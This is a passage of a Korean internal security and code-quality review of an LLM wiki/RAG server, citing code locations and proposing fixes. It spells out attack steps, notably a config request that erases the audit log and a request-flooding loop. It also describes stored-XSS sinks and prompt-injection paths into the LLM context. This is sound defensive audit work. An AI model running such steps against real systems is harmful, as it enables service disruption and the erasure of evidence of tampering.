부수: `auth.py:482 PUBLIC_PATHS` 는 프로젝트 전체에서 참조 0건의 **데드 코드**다.
공개 경로 목록은 실제로 `server.py:676-695` 에 하드코딩돼 있다 — 감사하는 사람이 `PUBLIC_PATHS` 를
"그 목록" 으로 믿으면 틀린다.

#### 조치

1. `GET` 기본값을 뒤집는다. 최소한 **명시적 허용 목록**(`_READ_GET`)을 만들고 목록 밖은 `admin` 으로.
   지금 read 로 열려 있는 GET 이 80개 넘으므로 한 번에 뒤집으면 화면이 깨진다 —
   먼저 목록을 만들고, 목록 밖을 로그로만 경고한 뒤 전환하는 2단계가 현실적이다.
2. `/api/logs` 의 `file` 을 `os.path.basename` + 허용 파일명 집합으로 제한한다 (즉시).
3. `/api/query_trace` 에 `/api/request` 와 같은 소유자 검사를 붙인다 (§2.4 와 같은 조치).
4. `/api/forensic/llm`·`/api/analysis/insight` 를 `run` 으로 올린다.

---

### 2.7 🟠 중간 — GET 요청이 속도 제한·동시 수 제한·대기열을 전부 우회한다 (문서와 코드가 어긋난다)

`CONCURRENCY.md:71-78` 은 이렇게 그린다.

```
요청 도착
  → 차단 목록 / 점검 모드 확인        (403 / 503)
  → 분당 속도 제한 확인               (429 + Retry-After)
  → 동시 수 제한 확인 (사용자·IP)     (429)
  → 대기열 진입 (상한·시간 초과)      (503)
  → 읽기 슬롯 획득 → 실행
```

코드는 다르다. `do_GET`(`web/server.py:621-640`)은 `pipe.request_scope()` 만 열고 티켓을 받지 않는다
(주석이 명시적이다: `server.py:629` "GET 은 락을 잡지 않는다"). 실제로 검사되는 것은 `mgr.check_access`(`server.py:698`)
— 차단 목록과 점검 모드뿐이다. 속도 제한·동시 수·대기열은 `RequestManager.ticket()` 안에 있고(`reqmgr.py:534-576`),
GET 은 그 함수를 부르지 않는다.

티켓을 받는 GET 은 `HEAVY_GET` 9개뿐이다 (`server.py:669`, 적용은 `:816-817`).
**`/api/status` 와 `/api/activity` 는 그 목록에 없다.**

#### 실패 시나리오

```
로그인한 viewer 한 명이 스크립트로:
  while true: GET /api/status
→ rate_limit.per_user_per_min(60) 도 per_ip_per_min(120) 도 적용되지 않는다.
→ /api/status 는 self._status() (server.py:499-524) 를 부르고, 그 안에서
   store.stats() 가 COUNT(*) 를 11번 돈다 (store.py:353-369) — docs/chunks/embeddings/
   entities/relations/mentions/communities/query_log/requests/proposals/synonyms.
   1만 문서 규모에서 relations·mentions 는 수백만 행이다.
→ 게다가 provider_status() 가 역할마다 llm_for(role) 을 만든다 (pipeline.py:465-485).
→ 서버가 읽기 슬롯도 쓰지 않으므로 "동시 8건" 제한 밖에서 CPU/IO 를 먹는다.
```

악의가 없어도 일어난다: 브라우저 탭 하나가 2초마다 `/api/activity` 를 부르고(`static/js/core.js:1215`),
`loadStatus()` 가 `/api/status` 를 부른다(`static/js/core.js:472`). 30명이 탭을 열어 두면 **초당 15건의
`/api/activity`** 가 무조건 들어오고, 각각이 `RequestManager._lock` 을 잡고 `active` 전체와 history 25건을
순회하며 `progress._LOCK` 까지 잡는다 (`reqmgr.py:760-785`, `_snap_ticket` → `_pg.get`).
그 락은 **티켓 발급 경로와 같은 락**이다 (`reqmgr.py:394-395`).

#### 조치

- `/api/status`·`/api/activity` 를 `HEAVY_GET` 에 넣거나(슬롯은 과하다), 최소한 **속도 제한만 적용**하는
  가벼운 경로를 만든다 (`weight="none"` 티켓 = 등록만. `reqmgr.py:536` 이 이미 `weight != "none"` 으로 갈라 두었으므로
  `weight="none"` 티켓은 속도 제한도 건너뛴다 — 그 분기를 손봐야 한다).
- `store.stats()` 의 COUNT 를 캐시한다 (`build_version` 별). 화면에 뜨는 숫자는 실시간일 필요가 없다.
- `CONCURRENCY.md §3` 의 흐름도에 "GET 은 차단/점검만 본다" 를 명시한다. 지금 문서는 **사실이 아니다**.

---

### 2.8 🟠 중간 — 컨텍스트의 그래프 관계·MCP 수집 블록이 인젝션 방어와 접근 제어를 둘 다 통과하지 않는다

`build_context`(`answer.py:174-313`)는 청크 본문에는 `ctxguard.neutralize` 를 적용하고 펜스로 감싼다(`:254-259`).
그런데 **그 뒤에 붙는 두 블록은 날것이다**:

```
answer.py:293-299   그래프 관계
    lines.append("- %s -[%s]-> %s%s%s" % (r["src"], r["rel"], r["dst"],
                 (": " + r["description"][:90]) if r.get("description") else "", …))
answer.py:300-306   MCP 외부 소스
    lines.append("- [%s] %s %s: %s" % (e.get("source"), e.get("id"), e.get("title"),
                 (e.get("text") or "")[:300].replace("\n", " ")))
answer.py:307
    body = "\n\n".join(parts) + ("\n\n" + graph_txt if graph_txt else "")
```

**(a) 인젝션.** `ctxguard.py` 의 docstring(11-12줄)은 "크롤링·MCP 수집으로 외부 글이 들어오기도 한다" 를
방어 이유로 명시한다. 그런데 정작 MCP 수집 텍스트(`mcp_enrich`, 최대 300자 × 5건)는 `neutralize` 를 거치지 않는다.
관계 `description` 도 마찬가지다 — 이 값은 `llm_graph` 가 켜져 있으면 **문서 본문에서 LLM 이 뽑아낸 자유 문자열**이다
(`graph_llm.py:21-35`, 검증 없음).

**(b) 접근 제어.** `doc_acl` 단계는 `hits` 와 `chunks` 만 거른다(`query_engine.py:1184`, `:1194-1196`).
`graph_res` 는 손대지 않고, 그대로 `build_context(final, chunks, graph_res, …)`(`query_engine.py:1333`)로 넘어간다.
따라서 **가려진 문서에서 추출된 관계 삼중항과 90자 설명**이 viewer 의 컨텍스트에 들어간다.

`QA_HARDENING_0919.md §8` 은 "그래프 엔티티 **이름**의 접근 제어" 를 의도적으로 하지 않았다고 적었다.
여기서 지적하는 것은 **이름이 아니라 설명 문장**이고, 그 축은 §8 에 없다.

#### 실패 시나리오

```
corpus/hr/2026-평가.md 에 "김철수 -[평가등급]-> S" 관계가 추출돼 있다.
viewer 가 "김철수" 를 묻는다 → doc_acl 이 hr 청크를 전부 거른다 (의도대로)
→ 그러나 graph_search 가 같은 엔티티에서 관계를 찾아오고,
   build_context 의 "## 그래프 관계 (참고)" 블록에 그 삼중항과 설명이 들어간다.
→ 답변 LLM 이 그것을 읽고 "김철수의 평가등급은 S입니다" 라고 답한다. 인용은 없으므로
   claim_check 가 uncited/unsupported 로 깎지만, **문장은 이미 화면에 있다.**
```

#### 조치

- `graph_txt` 를 만들기 전에 `relations` 를 `acl_filter` 로 거른다 (관계마다 `chunk_id` 가 있으므로
  `af.chunk_ok(r["chunk_id"])` 로 충분하다 — `retrieval.py:314` 가 이미 `chunk_id` 를 싣고 있다).
- `graph_txt` 전체에 `ctxguard.neutralize` 를 적용하고, `parts` 와 같은 펜스로 감싼다.

---

### 2.9 🟠 중간 — 질의 한 건마다 `threading.Lock` 하나가 영구히 쌓인다

`atomicio._locks` 는 경로별 락 딕셔너리인데 **정리되지 않는다**:

```
llmwiki/atomicio.py:45-55
    _locks: Dict[str, threading.Lock] = {}
    def _lock_for(path):
        key = os.path.abspath(path).lower()
        with _locks_guard:
            lk = _locks.get(key)
            if lk is None:
                lk = _locks[key] = threading.Lock()   ← 삭제하는 코드가 없다
            return lk
```

대부분의 호출자는 고정된 설정 파일이라 문제가 없다. 그런데 **요청마다 다른 경로**로 쓰는 곳이 하나 있다:

```
llmwiki/store.py:1136-1142   (log_request 안, 질의마다 실행)
    path = self.archive_request(archive_dir, rid, {...})
llmwiki/store.py:1151-1158
    path = os.path.join(sub, "req_%d.json" % rid)      ← request_id 마다 다른 경로
    atomicio.write_json(path, payload)                  ← _lock_for(새 경로)
```

`archive_dir` 은 `requests_dir` 기본값 `data/requests` 로 **항상 켜져 있고**(`config.py:352`),
`/api/query` 는 `keep=…, archive_dir=s.requests_archive_dir()` 로 이 경로를 탄다(`query_engine.py:547-548`).

#### 실패 시나리오

30명 × 하루 20질의 = 600질의/일 → 락 600개/일 → 1년 약 22만 개 항목.
객체 자체는 작지만(엔트리당 ~150B), (1) 딕셔너리가 계속 커지고 (2) `_locks_guard` 를 잡은 채 하는
`dict.get` 이 점점 느려지며 (3) 프로세스 메모리가 **절대 줄지 않는다**.
`CONCURRENCY.md §9` 의 "며칠 켜 두면 점점 느려지고 메모리가 는다" 행은 이 원인을 **SQLite 세션 누수 하나로만** 지목한다.

`tests/test_resource_limits.py` 의 soak 은 `pool_info().live` · 스레드 수 · 진행 표시만 본다 —
`atomicio._locks` 는 보지 않는다.

#### 조치

`_lock_for` 에 상한(LRU 또는 `_locks` 크기 초과 시 전체 비우기)을 두거나, `archive_request` 처럼
**경로가 매번 다른 호출**은 락 없이 쓰도록 분리한다(임시 파일 이름에 이미 난수가 있으므로 경합이 없다).

부수 항목(같은 성격, 낮음): `RequestManager._rate`(`reqmgr.py:400`)와 `RequestManager.clients`(`reqmgr.py:399`)도
정리 코드가 없다. 키는 사용자·IP 단위라 사내 환경에서는 수백 개로 수렴하므로 실질 위험은 낮지만,
`clients[key]["origins"]` 까지 누적되므로 "0이 정상" 이라고 말할 수 있는 상태는 아니다.

---

### 2.10 🟠 중간 — 잡(job) 결과에 소유자 검사가 없고, 잡 id 가 목록으로 노출된다

```
web/server.py:809-815   GET /api/progress
    jobs = [{k: v for k, v in j.items() if k in ("id","kind","status","started","finished")}
            for j in _JOBS.values()]           ← 모든 잡의 id 를 돌려준다

web/server.py:799-808   GET /api/jobs/<id>
    with _JOBS_LOCK: j = _JOBS.get(jid)
    if not j: return 404
    out = {k: v for k, v in j.items() if k != "result" or j.get("status") != "running"}
    return self._json(out)                     ← j["user"] 를 아무도 보지 않는다
```

`_start_job` 은 `job["user"]` 를 기록하고(`server.py:2102`), `DELETE /api/jobs/<id>`(취소)는 소유자를 확인한다
(`server.py:614`, `_job_cancellable` `server.py:414-420`). 그런데 **조회는 확인하지 않는다.**

#### 실패 시나리오

```
viewer 가 GET /api/progress → 지금 도는 모든 잡의 id 목록
→ GET /api/jobs/<id> → 그 잡의 result 전문
   · eval  → 평가셋 질문과 답변
   · sweep → 값별 답변·컨텍스트 (§2.3 때문에 admin 권한으로 만들어진 것)
   · build → 빌드 결과(문서 목록·경로·alerts)
```

#### 조치

`/api/jobs/<id>` 에 `/api/request` 와 같은 검사(본인 또는 `requests all` 권한)를 붙이고,
`/api/progress` 의 잡 목록도 본인 것 + admin 전체로 좁힌다.

---

### 2.11 🟠 중간 — 서버가 연결마다 OS 스레드를 만들고, 상한이 없다

```
web/server.py:2231-2232
    httpd = ThreadingHTTPServer((host, port), Handler)
    httpd.daemon_threads = True
```

`ThreadingHTTPServer` 는 **연결 하나당 스레드 하나**를 만들고 풀이 없다. `queue_max`(64)·`max_parallel_reads`(8)는
`RequestManager.ticket()` 안의 논리적 제한이므로, **스레드는 이미 만들어진 뒤**다. 게다가 keep-alive 가 기본 30초라
(`server.py:2228-2230`) 유휴 연결이 스레드를 30초씩 물고 있다.

30명 × 브라우저 동시 연결 6개 = 180 스레드가 **정상 상태**다. 여기에 MCP 클라이언트·CLI·스케줄러가 더해진다.
악의적이든 실수든 연결을 1,000개 열면 스레드 1,000개가 생기고, 각각이 8MB 스택을 예약한다.

`verify_monkey.py --threads 16` 은 이 상황을 만들지 않는다(클라이언트 스레드가 16개).

**추측**: 실제로 무너지는 지점은 측정하지 않았다. 다만 `DEEP_REVIEW_0919 §6.1` 의 soak 이
"16 클라이언트" 로만 돌았으므로, **연결 수 자체를 늘리는 부하는 아직 시험된 적이 없다**는 것은 확실하다.

#### 조치

표준 라이브러리 안에서 할 수 있는 것: `socketserver.ThreadingMixIn` 을 감싸 동시 연결 수를 세고
상한을 넘으면 즉시 503 을 쓰고 닫는 커스텀 서버 클래스. (스레드 풀을 직접 구현하는 것은 과하다 — §7 참조.)

---

### 2.12 🟠 중간 — 감사 로그가 설정 한 줄로 비워지고, 무결성 장치가 없다

`SECURITY.md §7` 은 감사 로그를 보안 통제로 제시하면서 **로테이션·truncate·무결성을 한 글자도 언급하지 않는다.**
코드는 이렇다.

```
auth.py:1076-1088   _rotate_audit()
    if backups <= 0:
        open(path, "w", encoding="utf-8").close()      # ← 통째로 비운다
        return
```

임계값은 평범한 설정이다 — `config.json` 의 `audit_max_mb` / `audit_backups` (`config.py:388-389`,
`config.py:1131` 주석이 "0 = 초과 시 비운다" 라고 적고 있다).

따라서 **admin 이 `POST /api/config {"settings":{"audit_max_mb":0.001,"audit_backups":0}}` 를 저장하면,
다음 감사 한 줄이 기록되는 순간 `audit.jsonl` 전체가 지워진다.** 그 config 변경 자체도 감사에 남지만
**그 줄도 함께 사라진다.** 즉 감사 로그가 자기 삭제의 증거를 남기지 못한다.

부수 두 가지:

- **무결성 장치 전무** (`auth.py:1091-1114`). 평문 append, 해시 체인 없음, 서명 없음, 외부 sink 없음,
  OS append-only 속성 미설정. 서버 프로세스 권한을 가진 자는 임의 편집이 가능하다.
- **쓰기 실패를 삼킨다** — `write_audit` 전체가 `except Exception: pass`(`auth.py:1113-1114`).
  디스크가 차거나 권한이 없으면 **작업은 성공하고 기록만 사라진다**(fail-open).
  같은 모양이 `make_cookie` 의 세션 등록(`auth.py:692-693`)에도 있다.

이 항목을 '중간' 으로 둔 이유: 착취에 admin 권한이 필요하다. 그러나 §2.2 가 class2 → 임의 실행을 열어 두었으므로
**두 결함이 결합하면 흔적 지우기까지 이어진다**. 그래서 §2.2 를 고치기 전에는 실질 등급이 더 높다.

#### 조치

감사 로그만큼은 `backups <= 0` 일 때 **비우지 말고 그대로 두거나 거부**한다.
그리고 `SECURITY.md §7` 에 로테이션 정책과 "이 로그는 변조 방지가 아니다" 를 명시한다 —
지키지 못할 보증을 문서가 암시하지 않는 것이 중요하다.

---

### 2.13 🟡 낮음 — 저장된 XSS 경로 두 곳 (둘 다 기본 off 토글에 의존)

프런트엔드는 `esc()`(`static/js/core.js:6`)를 981회 쓰는 등 escaping 규율이 대체로 좋지만, "이 필드는 짧은 식별자라
HTML 이 들어올 리 없다" 는 가정으로 비워 둔 자리가 있다. 그중 **서버 데이터가 LLM 을 거쳐 오는** 두 곳이 실제 위험이다.

| # | 싱크 | 데이터 흐름 | 전제 |
|---|---|---|---|
| A | `static/js/knowledge.js:112` — `<span class="pill">${e.type}</span> <span class="pill">${e.source}</span> (escape 없음) | 코퍼스 문서 → `graph_llm.llm_extract`(`graph_llm.py:21-35`, 값 검증 없음) → `entities.type` → `/api/entity` → innerHTML | 토글 `llm_graph` (기본 **off**, `config.py:193`) |
| B | `static/js/ask.js:227` — `'문서 유형 힌트: ' + plan.doc_types.join(', ')` (escape 없음), 싱크는 `ask.js:232` `#q-evidence`.innerHTML | 사용자 질의 → 라우터 LLM 응답의 `doc_types` 문자열을 그대로 append (`query_engine.py:258-260`) → `result.plan.doc_types` → requests 테이블 → 화면 | 토글 `router_llm` (기본 **off**, `config.py:235`) |

B 가 특히 성가신 이유: `result` 는 `requests` 테이블에 저장되고(`store.py:1131`),
Observability 에서 **admin 이 남의 요청을 열어 볼 때** 다시 렌더된다(`/api/request` → `LW.openPastRequest`).
즉 일반 사용자가 만든 페이로드가 admin 브라우저에서 실행되는 **저장형 XSS** 가 된다.
CSRF 는 헤더 방식(`api()` 가 `X-Requested-With` 를 붙임, `core.js:108-138`)이라 XSS 앞에서는 무력하다.

부수 사항: `esc()` 는 `& < > "` 만 바꾸고 **`'` 를 바꾸지 않는다**(`core.js:6`). 지금은 모든 속성이 쌍따옴표라
안전하지만, 계약이 코드에 적혀 있지 않아 다음 사람이 깰 수 있다.

#### 조치

두 자리에 `esc()` 를 넣는 것은 1줄씩이다. 더 중요한 것은 **서버에서 막는 것** —
`graph_llm` 이 돌려주는 `type`/`source` 를 알려진 값 집합으로 좁히고, 라우터 LLM 의 `doc_types` 를
`DOC_TYPE_HINTS` 키(`query_engine.py:51-59`) 또는 `schema.py` 의 문서 유형으로 제한한다.
LLM 출력은 **신뢰 경계 밖**이라는 원칙이 `ctxguard.py` 에는 있는데 다른 곳에는 없다.

---

### 2.14 🟡 낮음 — 프런트엔드 폴링 정리 누락

(상세 목록은 §3.5. 여기에는 실제 증상이 있는 것만.)

- `static/js/knowledge.js:97` — 그래프 캔버스의 `requestAnimationFrame` 루프가 **취소되지 않는다**.
  탭 전환은 CSS 클래스만 바꾸므로 캔버스가 DOM 에 남아 있어 `tick()`(`:68-98`)의 종료 조건(`!cv.isConnected`)이
  영원히 거짓이다. 물리 연산은 400회 뒤 멈추지만(`:82`) `clearRect` + 전체 재그리기 + 다음 rAF 는 계속 돈다.
  → Knowledge 탭을 한 번 본 사용자의 브라우저는 하루 종일 60fps 로 캔버스를 다시 그린다.
- `static/js/collab.js:250` — 1초 주기 폴링에 `document.hidden` 검사가 없다.
  `core.js:1199` 의 activity 폴링은 그 검사를 하는데 collab 은 하지 않는다 — 같은 파일군 안에서 규칙이 갈린다.
- `static/js/core.js:826` — `pollJob` 이 `j.error === 'no such job'` 이라는 **정확한 문자열**로만 멈춘다.
  서버는 실제로 그 문자열을 쓰지만(`web/server.py:804`), 403·offline·`{busy:true}` 같은 다른 오류 모양에서는
  해제 조건이 맞지 않는다. 대부분 다음 틱에서 회복되므로 **낮음**으로 본다.

---

### 2.15 🟡 낮음 — 죽은 코드가 지적된 뒤에도 남아 있다

`CODE_REVIEW_0917.md:227` 이 이미 지목한 항목들이 그대로 있다.

- `Pipeline._query_legacy` — **157줄**, 호출처 0 (`pipeline.py:1433`, grep 결과 정의만 존재).
  v3 엔진과 로직이 갈라져 있어, 읽는 사람이 "둘 중 어느 쪽이 진짜인가" 를 매번 판단해야 한다.
- `static/js/corpus.js:49` — `const extAuto = () => {};` 빈 스텁인데 `:102` 에서 인자를 주고 호출한다.
- `static/js/core.js:413-416` `clearTuningOverrides` — 정의 + export 뿐, 호출 0.
- `static/js/corpus.js:50` `loadExternalWork` — 정의 뿐, 호출 0.

반대로 **이미 고쳐진 지적이 문서에 남아 있다**: `CODE_REVIEW_0917.md:76` 은 `retrieval.rrf_fuse` 를 죽은 코드로
적었지만, 지금은 `channel_search` 의 `rrf` 모드가 쓴다 (`retrieval.py:444`). 리뷰 문서가 갱신되지 않아
**다음 사람이 살아 있는 코드를 지울 위험**이 있다.

---

### 2.16 🟡 낮음 — 문서 사이의 수치가 서로 다르다 (신뢰도 문제)

`DEEP_REVIEW_0919.md §6.4` 가 청크 수의 자기모순을 지적했는데, **테스트 개수에도 같은 일이 일어났다**.

| 문서 | 주장 | 실제 |
|---|---|---|
| `QA_HARDENING_0919.md:21` | 단위 428개 | ✔ **428** (`tests/*.py` 의 `def test_` 실측) |
| `DEEP_REVIEW_0919.md:232` | 343/343 | ✘ 옛 수치 |

같은 날짜(2026-09-19)의 두 문서가 다른 숫자를 말한다. §6.4 의 제안("수치를 문서에 박지 말고 명령으로 대신한다")이
정작 그 문서 자신에게도 적용되지 않았다.

---

## §3. 코드 품질

### 3.1 모듈 결합도 — 대체로 좋으나 `Pipeline` 이 신(God) 객체다

좋은 점: 대부분의 모듈이 **함수 단위**로 잘려 있고 의존이 단방향이다.
`retrieval.py`·`fusion.py`·`evidence.py`·`ctxguard.py`·`docacl.py`·`atomicio.py` 는 전부
"입력을 받아 값을 돌려주는" 순수 함수 묶음에 가까워서 단독으로 테스트할 수 있다.
지연 import(`from . import xxx` 를 함수 안에서)를 광범위하게 써서 순환 의존을 피한 것도 의도적이다
(예: `query_engine.py:229`, `:319`, `:530`, `:558`, `:1059`, `:1070`).

문제: `Pipeline`(1,667줄)이 **설정·저장소·프로바이더·캐시·락·빌드·질의·평가·워처·신분**을 전부 들고 있다.
`query_engine.py` 는 `self.pipe` 를 통해 그 전부에 닿는다(`p.s`, `p.store`, `p.embedder`, `p.llm_for`, `p.acl_filter`,
`p._cache_key`, `p.qcache_put`, `p.store.log_request`, …). 그래서 `QueryEngine` 을 단위 테스트하려면
`Pipeline` 전체를 흉내 내야 하고, 실제로 `query_engine.py` 에는 전용 단위 테스트가 없다(§4.2).

### 3.2 함수 길이 — 상위 5개가 전체의 문제를 대표한다

| 함수 | 줄 수 | 파일:줄 |
|---|---:|---|
| `cli._run_cmd` | **982** | `cli.py:867` |
| `Handler._do_get` | **533** | `web/server.py:671` |
| `Handler._dispatch_post` | **~520** | `web/server.py:1557-2079` |
| `QueryEngine.run` | **462** | `query_engine.py:135` |
| `cli.build_parser` | 393 | `cli.py:58` |
| `mcp.call_tool` | 348 | `mcp.py:516` |

`_run_cmd`·`_do_get`·`_dispatch_post`·`call_tool` 은 전부 **거대한 if-elif 디스패처**다. 이것은
"세 창구가 같은 기능을 제공해야 한다" 는 제약의 직접적 결과이고, 어느 정도는 불가피하다 —
디스패치 표를 데이터로 빼면 각 분기의 특수 처리(티켓 가중치·잡 여부·overrides 필터)를 표현하기 어렵다.

그러나 **대가는 §2.3 이 그대로 보여 준다**: 520줄짜리 함수 안에서 어떤 분기가 `actor` 를 넘기고 어떤 분기가
안 넘기는지는 사람이 눈으로 세는 수밖에 없다. 세 곳은 넘겼고 다섯 곳은 안 넘겼다.

`QueryEngine.run` 이 462줄인 이유는 조금 다르다. 이 함수는 **여섯 개의 직교하는 축**을 한 몸에 담고 있다:
정상 실행 / 캐시 적중 / 사전계산 적중 / 재생(resume) / 캡처(capture) / output_mode 조기 종료.
`if self.resume is not None` · `if self.capture is not None` · `if not is_answer` 가 함수 전체에 흩뿌려져 있어,
"재생 중에는 이 단계가 돌까?" 를 답하려면 462줄을 다 읽어야 한다. §2.4(a)의 결함이 정확히 이 구조에서 나왔다.

### 3.3 중복

**`_retrieve` 안의 반환 딕셔너리 3벌** (`query_engine.py:1226-1229`, `:1300-1303`, `:1339-1342`).
`stop_after == "boost"` · `stop_after == "rerank"` · 정상 종료가 각각 18개 키의 거의 같은 딕셔너리를 손으로 만든다.
키가 하나 추가되면 세 곳을 다 고쳐야 하고, 실제로 `inject` 키는 첫 번째 벌에서 `{}` 로 비어 있다(`:1227`) —
의도인지 누락인지 코드만으로는 알 수 없다. **확인 필요.**

**`_replay_retrieval` 이 네 번째 벌이다** (`query_engine.py:639-645`). 여기에는 `rule_src` 키가 없고
`replayed`·`missing_chunks` 가 추가돼 있다. 즉 같은 자료구조의 **모양이 경로마다 다르다**.

**프런트엔드의 렌더링 중복** (하위 에이전트 실측):
`<table>` 리터럴 79개(9파일), `<div class="stat">` 108회, `class="pill"` 89회.
추출된 헬퍼는 `knowledge.js:134 tbl()` · `knowledge.js:140 stat()` · `ask.js:115 verdictPill()` 뿐이고
**전부 한 파일에서만 쓰인다**. "타입 기술자 → 입력 위젯" 함수가 세 벌 있다:
`settings.js:853 tuningInput` · `pipeline.js tuneInput` · `observability.js:375 srvInput`.

### 3.4 일관성 없는 패턴

| 축 | 갈라진 모양 |
|---|---|
| **actor 전달** | §2.3 — 3곳 전달 / 5곳 누락 |
| **overrides 필터** | Web 은 `_dispatch_post` 진입부에서 건다(`server.py:1561`), **MCP 는 안 건다**(`mcp.py:512`) — §2.1 |
| **소유자 검사** | `/api/request` 는 한다(`server.py:917`), `/api/rerun`·`/api/query_trace`·`/api/jobs/<id>` 는 안 한다 |
| **인가 기본값** | POST 는 fail-closed(`edit`, `auth.py:431`), GET 은 fail-open(`read`, `auth.py:361`) — §2.6 |
| **예외 처리 방향** | `docacl` 은 fail-closed 로 고쳤는데(`query_engine.py:1186-1190`, `server.py:222-227`), `pins`(`query_engine.py:307`)·`ruleeffect`(`:498`)·`forensic`(`:576`)·`memory`(`:583`)는 `except Exception: pass` 로 조용히 넘긴다. 후자는 관측용이라 맞는 선택이지만, **같은 함수 안에서 두 정책이 섞여 있어** 새 코드를 넣는 사람이 어느 쪽을 따라야 할지 모른다 |
| **청크 자료형** | `sqlite3.Row` 와 `dict` 가 섞여 흐른다. `query_engine._row_dict`(`:62-66`)와 `docacl.Filter.doc_id_of`(`:183-200`)가 각각 방어하는데, 이 문제는 QA 4-C 에서 **보안 결함**으로 한 번 터졌다. 방어를 늘리는 대신 경계에서 dict 로 정규화하는 편이 맞다 |
| **프런트 크로스모듈 호출** | `ask.js:13` 은 `LW.openRequest &&` 로 가드하고 `observability.js:309` 는 직접 부른다 |
| **에러 표면** | `toast()`(131회) / `class="banner"`(18회, 4파일에만) / `#…-msg` 요소 약 20종 / `confirm()`·`prompt()` 20회 — 네 채널이 공존 |

### 3.5 관측 코드가 본체를 덮고 있다

`query_engine.run` 462줄 중 상당 부분이 `st.note(...)` · `st.debug(...)` · `prof.skipped(...)` · `prof.replayed(...)` 다.
이것이 이 프로젝트의 강점(§1.1)이자 가독성의 대가다. 특히 `prof.skipped("X", "이유")` 가
**단계를 건너뛰는 모든 분기마다** 필요해서 분기 수만큼 줄이 늘어난다(예: `:344-348`, `:394`, `:415`, `:469-471`, `:535`).

이것을 "없애야 할 잡음" 으로 보면 안 된다 — 이 기록이 없으면 `--trace` 가 거짓말을 한다.
다만 `with prof.stage(...)` 데코레이터화 같은 문법적 정리는 가능하다.

---

## §4. 테스트 사각지대 (QA_HARDENING_0919 가 이미 다룬 것 제외)

실측: `tests/` **36파일 428개** `def test_` (파일별 합산). `QA_HARDENING_0919 §6` 의 매핑표는 정확하다.
`tools/verify/` 는 23개 파일, 그중 `verify_all.py` 의 `SUITES`(`:34-85`)에 등록된 것이 21종(기본) ~ 25종(`--full`).

### 4.0 이 절의 핵심 한 줄

> **QA_HARDENING_0919 가 "고쳤다"고 적은 결함 중 최소 셋은, 고친 *자리*가 아니라 고친 *함수*만 테스트한다.**
> 그래서 그 수정을 통째로 되돌려도 428개 테스트가 전부 초록이다.

| QA 결함 | 실제 수정 지점 | 테스트가 부르는 것 | 되돌려도 통과? |
|---|---|---|---|
| 4-A / 4-D (신분 전달) | `web/server.py:188 _actor_of` · `:573`(`/mcp` 핸들러) · `:1645/1674/1685 _actor_from_client` | `tests/test_doc_acl.py:199` — **테스트가 직접** `request_scope(actor=…)` 를 연다 | **예.** grep 결과 `_actor_of`·`_actor_from_client` 는 `tests/` 에서 히트 0 |
| 2-A (모델 창 예산) | `query_engine.py:1329` · `pipeline.py:1534` 의 `budget_limited=` | `tests/test_context_budget.py` — `mc.context_budget()`·`build_context()` 직접 호출 | **예.** `budget_limited`·`truncated_chunks` 문자열이 `tests/` 전체에 **0건** |
| 1-A (MCP structuredContent) | `mcp.py` 의 응답 조립 | `test_surface_consistency.py:112,119` 가 `if …structuredContent … else None` 로 **없으면 조용히 건너뛴다** | 부분적 (`:138` 이 별도로 막아 준다) |

이것이 §2.1·§2.3 이 존재할 수 있었던 구조적 이유다. 테스트가 **자기가 검증한다고 주장하는 배선을 스텁으로 치웠다.**

같은 모양이 넷 더 있다.

| 위치 | 문제 |
|---|---|
| `tests/test_ensemble_surface.py:110-130` | docstring 은 "`GET /api/models` 가 … 내려주고 `POST /api/models/set` 이 파일에 저장하는지 **여기서 검사한다**" 라고 적혀 있으나, 실제로는 `server.py`(`:113`)·`settings.js`(`:122`)·`cli.py`(`:129`) 의 **소스 문자열**을 `assertIn` 한다. 응답이 틀려도 통과하고, 변수명만 바꿔도 깨진다 |
| `tests/test_surface_consistency.py:92-96` | `_cli()` 가 CLI 가 아니라 `self.p.query()` 를 직접 부른다(주석에 명시). QA TC-1.1 이 약속한 `python -m llmwiki query --json` 경로(인자 파싱·`--json` 직렬화·`run_captured` 래핑)는 **비교 대상에서 빠져 있다** |
| `tests/test_surface_consistency.py:155-157` | `_supports_overrides()` — `Pipeline.query` 에 `overrides` 인자가 없으면 CLI 비교가 **스스로 꺼진다**(`:147`,`:152`). QA 1-B 회귀를 잡으려는 테스트가 **회귀가 나면 조용해진다** |
| `tests/test_rag_edge_cases.py:109` | `assertIn(verdict, ("insufficient","weak","sufficient"))` — **가능한 값 전부를 허용**한다. "색인에 없는 주제는 모른다고 답한다"(TC-2.3)가 사실상 단언되지 않는다 |

### 4.1 가장 큰 구멍: "기능이 있는가" 는 보는데 "배선이 됐는가" 는 아무도 안 본다

`tools/verify/verify_surface_align.py:29-31` 이 스스로 밝힌 대로, 그 표는
**이름이 존재하는지**만 본다 (`cli.py` 서브커맨드 · `server.py` 경로 · `mcp.py` TOOLS).
`QA_HARDENING_0919 §1` 이 여기에 "같은 값을 돌려주는가"(`test_surface_consistency.py`, 8항목)를 더했다.
그러나 세 번째 축이 여전히 없다:

> **같은 파이프라인 계약을 지키는가** — 질의를 실행하는 모든 진입점이 `actor`·티켓·소유자 검사·overrides 필터를
> 동일하게 통과하는가.

이것이 §2.3·§2.4·§2.10 을 모두 놓친 이유다. 제안하는 테스트:

```python
# tests/test_entrypoint_contract.py (제안)
# 1) 질의를 실행하는 모든 경로에 viewer 로 요청을 보내고, docacl 이 켜진 상태에서
#    가려진 문서가 결과 어디에도(answer/refs/hits/ctx/candidates/job.result) 없음을 확인
ENTRYPOINTS = [
    ("POST", "/api/query",       {"q": Q}),
    ("POST", "/api/cli",         {"argv": 'query "%s" --json' % Q}),
    ("POST", "/api/query/rerun", {"request_id": RID, "from": "answer_llm"}),
    ("POST", "/api/sweep",       {"query": Q, "key": "top_k_final", "range": "3..4"}),
    ("POST", "/api/eval",        {}),
    ("POST", "/api/search",      {"q": Q, "channels": "fts,vector"}),
    ("POST", "/mcp",             {"method": "tools/call", "params": {"name": "wiki_query", ...}}),
]
# 2) 남의 request_id / job id 로 조회했을 때 403 인지
# 3) 캐시(query_cache·precompute)를 켠 상태에서 1)을 다시 — 높은 등급이 먼저 물은 뒤 낮은 등급이 같은 질문
```

`Pipeline.actor` 기본값을 `viewer` 로 바꾸는 조치(§2.3)를 하면, 이 테스트는 **회귀 방지 장치**가 된다.

### 4.2 테스트가 없는 모듈 — 가장 큰 것들이 비어 있다

`DEEP_REVIEW_0919 §5.2` 가 `query_engine`·`graph_build`·`embed_run`·`evidence`·`wiki`·`snapshots`·`graph_llm`·`profiles` 를 지목했다.
